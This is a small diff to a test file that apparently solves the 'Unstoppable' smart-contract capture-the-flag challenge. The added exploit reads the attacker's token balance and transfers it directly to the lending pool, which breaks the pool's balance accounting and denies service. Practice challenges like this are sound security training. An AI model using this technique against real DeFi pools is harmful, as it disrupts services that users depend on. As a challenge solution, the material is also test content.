@@ -40,6 +40,10 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        /* Get attacker's token balance */
+        let attackersBalance = await this.token.balanceOf(attacker);
+        /* Change the pool's balance with a transfer */
+        await this.token.transfer(this.pool.address, attackersBalance, { from: attacker });
     });
 
     after(async function () {
